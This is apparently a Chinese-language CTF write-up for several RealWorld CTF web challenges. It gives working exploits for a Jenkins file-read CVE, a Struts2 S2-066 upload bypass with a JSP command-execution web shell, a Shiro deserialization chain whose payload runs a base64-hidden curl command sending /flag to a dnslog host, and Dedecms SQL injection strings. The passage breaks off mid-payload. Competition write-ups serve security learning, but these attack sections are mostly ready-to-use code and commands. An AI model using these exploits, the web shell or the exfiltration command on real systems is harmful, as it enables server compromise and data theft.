      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RealWorld wp</title>
      <link href="/RealWorld/"/>
      <url>/RealWorld/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h2><p>信息收集，这是一个<code>Jenkins</code>的网站</p><p><img src="/./RealWorld/w_1_1.png"></p><p>微信搜这个网站的漏洞，可以得到<code>Jenkins 任意文件读取漏洞（CVE-2024-23897)</code></p><p><a href="https://mp.weixin.qq.com/s/ZIJYx5sYlpViWQFNUAoaHg">CVE-2024-23897｜Jenkins任意文件读取漏洞（POC）</a></p><p>先下载一个 <a href="http://jenkins:8080//jnlpJars/jenkins-cli.jar">jenkins-cli.jar</a></p><p>之后执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://47.96.171.129:8080/ who-am-i &quot;@/flag&quot;</span><br></pre></td></tr></table></figure><p>即可得到flag。</p><p><img src="/./RealWorld/w_1_2.png"></p><h2 id="Be-More-Elegant"><a href="#Be-More-Elegant" class="headerlink" title="Be-More-Elegant"></a>Be-More-Elegant</h2><p>Struts2 文件上传 S2-066</p><p>参考链接：<a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 文件上传分析(S2-066)</a></p><p>先看源码：</p><p><strong>JspFilter</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> be.more.elegant.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JspFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JspFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> ((HttpServletRequest)request).getServletPath();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/views&quot;</span>) || !path.endsWith(<span class="string">&quot;jsp&quot;</span>) &amp;&amp; !path.endsWith(<span class="string">&quot;jspx&quot;</span>)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;jsp not allowed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HeaderIconAction</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> be.more.elegant;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.action.ServletRequestAware;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeaderIconAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestAware</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">File</span> <span class="variable">UPLOAD_DIR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(HeaderIconAction.class.getClassLoader().getResource(<span class="string">&quot;../../statics/&quot;</span>).getFile(), <span class="string">&quot;uploads&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="keyword">private</span> String uploadedPath;</span><br><span class="line">    <span class="keyword">private</span> File fileUpload;</span><br><span class="line">    <span class="keyword">private</span> String fileUploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String fileUploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HeaderIconAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">remoteAddr</span> <span class="operator">=</span> <span class="built_in">this</span>.request.getRemoteAddr();</span><br><span class="line">            <span class="type">String</span> <span class="variable">md5ForIp</span> <span class="operator">=</span> <span class="built_in">this</span>.md5Ip(remoteAddr);</span><br><span class="line">            <span class="type">File</span> <span class="variable">sandBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR, md5ForIp);</span><br><span class="line">            <span class="type">File</span> <span class="variable">fileToCreate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(sandBox, <span class="built_in">this</span>.fileUploadFileName);</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.fileUpload, fileToCreate);</span><br><span class="line">            <span class="built_in">this</span>.uploadedPath = <span class="string">&quot;statics/uploads/&quot;</span> + md5ForIp + <span class="string">&quot;/&quot;</span> + <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">md5Ip</span><span class="params">(String ip)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md.update(ip.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">byte</span>[] var5 = digest;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> digest.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> var5[var7];</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b &amp; <span class="number">255</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getFileUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUpload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUpload</span><span class="params">(File fileUpload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUpload = fileUpload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUploadContentType</span><span class="params">(String fileUploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUploadContentType = fileUploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUploadFileName</span><span class="params">(String fileUploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUploadFileName = fileUploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadedPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadedPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">withServletRequest</span><span class="params">(HttpServletRequest httpServletRequest)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.request = httpServletRequest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能解析<code>/views</code>目录下的<code>.jsp</code>文件，因此把jsp马上传到<code>/views</code>。</p><p>Struts2的版本是<code>6.3.0</code>，这个版本的Struts2存在<code>S2-066</code>，在文件上传的时候可以路径穿越。</p><p>这里注意的是，上传时，要先用<code>fileUpload</code>参数上传成功一次，之后再用<code>FileUpload</code>上传，即可实现路径穿越。</p><p>jsp马：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_2_1.png"></p><p>访问<code>/views/test.jsp</code>，即可rce，执行<code>/readflag</code>即可得到flag。</p><p><img src="/./RealWorld/w_2_2.png"></p><h2 id="Old-Shiro"><a href="#Old-Shiro" class="headerlink" title="Old-Shiro"></a>Old-Shiro</h2><p>反编译jar包，可以看到账号密码，还看到了Cookie有一个<code>rememberMe_rwctf_2024</code>，是Shiro反序列化的入口。</p><p>查看依赖有<code>cb-1.9.2</code>，接下来用cb链去打。</p><p>因为header长度的限制，不能发送过长的Cookie，payload的长度有限制。</p><p>把没用的header都去掉，<code>POST</code>改成<code>GET</code>，最终可以发送<code>2900</code>左右的字符，因此生成的payload长度要在<code>2900</code>以内。</p><p><strong>MyClassLoader</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmdArray = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;&#123;echo,Y3VybCBgY2F0IC9mbGFnfGJhc2U2NGAuNmtxeGd2LmRuc2xvZy5jbg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>cmdArray</code>里主要执行的命令是</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl `cat /flag|base64`.6kqxgv.dnslog.cn</span><br></pre></td></tr></table></figure><p><strong>CommonsBeanutilsShiroPayload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutilsShiroPayload</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.构造TemplatesImpl对象，其中code就是读取第一步构造好的类加载器。</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\ctf_ide\\ysoserial-master\\target\\classes\\ysoserial\\MyClassLoader.class&quot;</span>));</span><br><span class="line">        System.out.println(code.length);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.实例化BeanComparator，其中comparator的部分就用我们找到的替换类</span></span><br><span class="line"><span class="comment">//            BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.实例化优先队列PriorityQueue，如下因为我们上面comparator是String类型，所以在add的时候要用String类型的字符串。</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.反射将property 的值设置成恶意的outputProperties ，将队列里的两个1替换成恶意的TemplateImpl 对象</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.序列化到文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终将生成的<code>test.bin</code>用<code>AES</code>加密并base64编码，即可得到长度为<code>2860</code>的payload。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># test.bin为编译好的序列化链的内容</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;test.bin&quot;</span>)</span><br><span class="line">    exp = aes_enc(data)</span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(exp))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b&#x27;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&#x27;</span></span><br><span class="line"><span class="comment"># 2860</span></span><br></pre></td></tr></table></figure><p>发送过去</p><p><img src="/./RealWorld/w_3_1.png"></p><p>在dnslog得到base64编码后的flag，解码即可得到flag</p><p><img src="/./RealWorld/w_3_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rwctf&#123;Sh0rT3r_Byt3c0d3_m4K3_L1f3_E4s13r&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="YourSqlTrick"><a href="#YourSqlTrick" class="headerlink" title="YourSqlTrick"></a>YourSqlTrick</h2><p>Dedecms v5.7.111前台tags.php SQL注入漏洞</p><p>参考链接: <a href="https://github.com/wy876/POC/blob/main/Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md">Dedecms v5.7.111前台tags.php SQL注入漏洞</a></p><p>抓包，可以在回显位2那里看到回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tag=a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(table_name),123,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--%20\\</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_4_1.png"></p><p><strong>库名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,database(),3,4,5,6,7,8,9,10,11--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dedecmsv57utf8sp2</span><br></pre></td></tr></table></figure><p><strong>表名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 